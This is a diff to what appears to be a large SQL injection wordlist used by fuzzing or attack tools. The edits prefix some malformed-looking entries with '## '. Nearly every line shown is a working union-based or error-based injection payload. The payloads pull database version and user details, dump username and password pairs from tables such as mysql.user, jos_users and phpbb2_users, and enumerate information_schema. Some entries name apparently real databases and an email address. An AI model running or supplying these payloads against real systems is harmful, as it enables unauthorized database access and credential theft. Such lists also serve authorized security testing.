@@ -747,7 +747,7 @@
 -113482 union select 1,concat_ws(0x3a,name,password),3,4 from users -- 
 -11364 union 
 -11364 union select 1,2,3,4,5,concat(version(),char(58,58),database(),char(58,58),user())/*
-113.9unionallselect1,2,concat_ws(0x3a,user(),version(),database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 -- 
+## 113.9unionallselect1,2,concat_ws(0x3a,user(),version(),database()),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 -- 
 1139 union select 1,concat_ws(0x3a,database(),user(),version()),3,4,5,6,7,8,9,10,11/*
 -113 UniON SElecT 1 -- 
 -113 union select 1,2,3,4,5,6,7,8,9,0,11,12,13,concat_ws(0x3a,version(),user(),database()),15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32/*
@@ -1693,7 +1693,7 @@
 13 union select user,2,3,password,host,6,7,8,9,10,11,12,13 from mysql.user/*
 -13 union select version() -- 
 -13 Union select Version()
-13` where id=-1 union select 1,2,3,concat_ws(0x3a,user(),version()),5,6,7 -- 
+## 13` where id=-1 union select 1,2,3,concat_ws(0x3a,user(),version()),5,6,7 -- 
 1402.310 and 1=2 union select 1,2,3,concat_ws(0x3a,database(),version(),user()),5,6,7,8,9,10,11,12,13,14--
 140246 union select 1,2,3,4,5,6,7,8,9,10,concat_ws(0x3a,version(),database(),user()),12,13,14,15,16,17,18,19,20,21,22,23,24,25--
 -1404 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,concat_ws(0x3a,user,host,file_priv),26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45 from mysql.user--
@@ -3271,12 +3271,12 @@
 1 group by 1 union select 1,2,version()/*
 -1' group by 1 union select 1,concat_ws(0x3a,version(),database(),user()) -- 
 1 group by tblProducts.ProductID having 1=1--
-1 gunion select 1,2,3,4 -- 
+## 1 gunion select 1,2,3,4 -- 
 1'id=-13 union select 1,2,3,4,5,6,7,8,9,10,11,12,13/*
 1 limit 0 union select 1,concat_ws(0x3a,user(),version(),database()),3,4-- 
 1-null union select 1,aid from nuke_authors--
 1 or 1
-1 or 1'
+## 1 or 1'
 -1' or 1=1-- 
 -1' or 1=1/*
 1' or '1'='1 order by 1--
@@ -7613,7 +7613,7 @@
 -2 union all select 1,concat_ws(0x3a,version(),user(),database(),@@version_compile_os),3-- 
 -2 union all select concat_ws(char(58),version(),user(),database(),@@version_compile_os),2,3--
 2 union elect 1,id,user(),4,5,6,7,8,9,10,11 from articles/*
--2 UNION SEL
+## -2 UNION SEL
 -2 UNION SELECT 0,1,2,3,4,5,6,7,concat_ws(0x0b,user(),version(),database()),9,10,11 -- 
 -2 union select 0,1,2,3,concat(username,0x3a,password),5,6 from users
 -2 UNION SELECT 0,2,3,4,5,6,7,CONCAT_WS(0x0b,Version(),Database(),User()),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 -- 
@@ -8810,7 +8810,7 @@
 -391 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,concat_ws(0x3a  ,user(),database(),version()),19,20,21,22,23--
 -392 union select 1,2,concat_ws(0x3a3a3a3a,loginname,password,email),4,5,6,7,8,9,10,11,12 from user--
 3931' and ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_name like char(37,117,115,101,114,37) limit 2,1),1,1))='117=u
-393.9unionallselect1,2,3,4,concat_ws(0x3a,user(),version(),database()),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 -- 
+## 393.9unionallselect1,2,3,4,concat_ws(0x3a,user(),version(),database()),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 -- 
 -393 union select 1,2,3,4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20,21,22,version(),24,25,26,27/*
 -393 union select VERSION(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16/*
 -39409 union select concat_ws(0x3a,version(),database(),user(),@@version_compile_os),2
@@ -9269,7 +9269,7 @@
 -413 union select 1,2,3,4,version(),6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,44/*
 -41400 union select 1,2,3,4,5,6,7,8,concat_ws(char(32),user(),version(),database())/*
 414114 union select 1,2,3,4,concat_ws(0x3a3a,version(),user(),database()),6,7,8,9,10,11,12,13,14,15,16,17,18,19--
-41_45 and 1=1--
+## 41_45 and 1=1--
 -414 union select concat_ws(0x3a,user,password) from mysql.user--
 4150 union select 1,2,3,4,5,6,7 from msysaccessobjects
 415 UNION SELECT 0,concat_Ws(0x0b,user(),database(),version()),2,3,4
@@ -9452,7 +9452,7 @@
 -4389 union select 1,concat_ws(0x3a,version(),user()),3,4,5,6 -- 
 -4391 union select 1,2,3,version(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--
 43-999.9 union select 1,2,concat_ws(user(  ),version(),database()),4,5,6--
-43.9unionallselect1,2,concat_ws(0x3a,user(),version(),database()) -- 
+## 43.9unionallselect1,2,concat_ws(0x3a,user(),version(),database()) -- 
 43 and 1=0 union select 1,2,version(),4,5,6,7,8,9,10,11--
 43 and 1=0 UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version(),@@version_compile_os ),3,4,5
 43 and 1=0 union select concat_ws(0x3a,login,password,level) froM pmr_admins -- 
@@ -12913,7 +12913,7 @@
 948 and 1=2 union select 1,2,group_concat(password),4,5,group_concat(login),7,8 from neoboy_admin--
 -948 union select 1,2,3,password,email,6,7,8,9,status,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25 from users/*
 -9490 union select 1,2,concat_ws(char(58),version(),user(),database()),4,table_name,6,7,8,9,10,11,12,13,14,15,16 from information_schema.tables -- 
-94.9unionallselect1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8 -- 
+## 94.9unionallselect1,concat_ws(0x3a,user(),version(),database()),3,4,5,6,7,8 -- 
 949 union select login from admins/*
 -94 union all select 1,2,3,4,5,6,@@version,8,9,10,11,12--
 -94 UNION SELECT 0,concat_Ws(0x0b,user(),version(),database()),2,3,4,5
@@ -13161,7 +13161,7 @@
 99999999 union select @@version,2,3,4,5,6,7,8-- 
 999999.9 UNION ALL SELECT 0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,(SELECT concat(0x7e,0x27,Company.Cm_email,0x27,0x7e) FROM `db_westbyte_1`.Company Order by Cm_email LIMIT 0,1) --
 999999.9 union all select 0x6E6F,version(),0x6E6F,0x6E6F,0x6E6F,0x6E6F,0x6E6F,0x6E6F,0x6E6F,0x6E6F,0x6E6F--
-999999.9unionallselect1,2,concat_ws(0x3a,user(),version(),database()),4,5,6,7 -- 
+## 999999.9unionallselect1,2,concat_ws(0x3a,user(),version(),database()),4,5,6,7 -- 
 999999.9'unionallselect1,concat(0x7e,0x27,concat_ws(0x3a,user(),version(),database()),0x27,0x7e),3,4 -- 
 999999.9 union all select concat(0x3d3e,unhex(Hex(cast(database() as char))),0x3c3d)--
 999999.9 union all select concat(0x7e,0x27,unhex(Hex(cast(database() as char))),0x27,0x7e),0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536,0x31303235343830303536--
@@ -13783,7 +13783,7 @@ alpine_boots where 1=2 union select version(),2,3,4,5,6,7,8,9,0,1,2,1,4,5,6,7,8,
 ' and 1=2/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,concat(username,char(58),password),0,11,12 from jos_users/*
 and 1=2 union  select 1,concat(username,char(58),pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27 from amp_forum_users--
 ' and (select*from(select count(*)from(select 1 union select 2 union select 3)x group by concat(mid((select concat_ws(0x3a,version(),database(),user()) from INFORMATION_SCHEMA.TABLES limit 0,1),1,64),floor(rand(0)*2)))z)-- 
-...a,password,0x3a,host),4,5,6,7,8 from mysql.user limit 1,1--
+## ...a,password,0x3a,host),4,5,6,7,8 from mysql.user limit 1,1--
 -apoio_psicologico' union select 1,2,3,4,5,6,7,8,9 -- 
 artist union select 1,2,concat_ws(0x3a,version(),user(),database()),4,5,6,7,8,9,10,11,12,13,14 -- 
 asd' and 1=0 union select 1,2,3,4,5,version(),7 -- 
@@ -13792,7 +13792,7 @@ a' union select 1,2,3 from sp_areadetails where '1'='1
 balt' aNd 1=0 UNION SELECT 1,version() -- 
 bbb' UNION SELECT 1,2,3,concat_ws(0x3a,user(),version(),database())-- 
 bbb' UNION SELECT 1,2,3,group_concat(version(),0x3a,user(),0x3a,database()) -- 
-besieged 1998 dvdrip part3 rar-999.9 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
+## besieged 1998 dvdrip part3 rar-999.9 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
 BG union select 0,concat(user(),0x3a,version(),0x3a,database()),2/*
 BIOS') union select 1,2,concat_ws(0x3a,username,user_password) from phpbb2_users#
 -bndom' union all select 1,2,version(),4-- 
@@ -13925,7 +13925,7 @@ opit' UNION SELECT 1,user,3,4,5,6,7,8 FROM mysql.user/*
 ' or 1=(selecttop1table_namefrominformation_schema.tables)-- 
 ' or 1=system_user--
 P008'or 1=@@version and ''='
--P:229-S:41 UNION SELECT 1,2,concat_ws(0x3a,version(),database(),user(),@@version_compile_os),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 limit 1,1
+## -P:229-S:41 UNION SELECT 1,2,concat_ws(0x3a,version(),database(),user(),@@version_compile_os),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 limit 1,1
 -page01' union select 1,2,concat_ws(0x3a,database(),version(),user()),4,5#
 PD' or 1=1 union select 1,2,3,group_concat(TABLE_SCHEMA,'.',TABLE_name),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19 from information_schema.TABLES where table_name like '%user%' -- 
 politicsgossip limit 0 union select 1,2,3,4,5,6/*
@@ -13936,7 +13936,7 @@ product-17 or 1 group by concat(concat_ws(0x3a3a,version(),user(),database(),@@v
 product-230 and 1=0 union all select 1,concat_ws(0x3a3a,version(),user(),database(),@@version_compile_os),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
 product/def-20 or 1 group by concat(concat_ws(0x3a3a,version(),user(),database(),@@version_compile_os),floor(rand(0)*2)) having min(0) or 1--
 product/show-7 or 1 group by concat(concat_ws(0x3a3a,version(),user(),database(),@@version_compile_os),floor(rand(0)*2)) having min(0) or 1--
- profsh_user 
+## profsh_user 
 P' union select 1,2,3,4,AES_DECRYPT(AES_ENCRYPT(concat(user(),char(58),version(),char(58),database()),0x71),0x71),6,7,8,9,0,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37/*
 Queen' union select 1,concat_ws(0x3a,username,password),3,4,5,6,7,8,9,10,11,12,13 from onecms_users -- 
 Reference and 1=0 union select concat_ws(0x3a,user_name,user_password),2,3,4,5,6 from DEV_mediawiki.ts_user -- 
@@ -14005,7 +14005,7 @@ twitch_hiscores' and 1=2 union select 1,2,3,4,concat_ws(0x3a,user(),version(),da
 u.-1 UNION SELECT concat_ws(0x3a,user() ,database(),version(),@@version_compile_os),2/*
 UK5666' and 1=0 or 1=(select top 1 name from sysusers) -- 
 unfathomable number-999.9 union select 1,2,3,4-
-*/ union
+## */ union
 ' union select 0,concat(id,char(58),login,char(58),email,char(58),pswd,char(58),is_user),2,3,4 from _user where email='info@artnow.ru'/*
 ' union select 1/*
 ' UNION SELECT 1,2,3,4,5/*
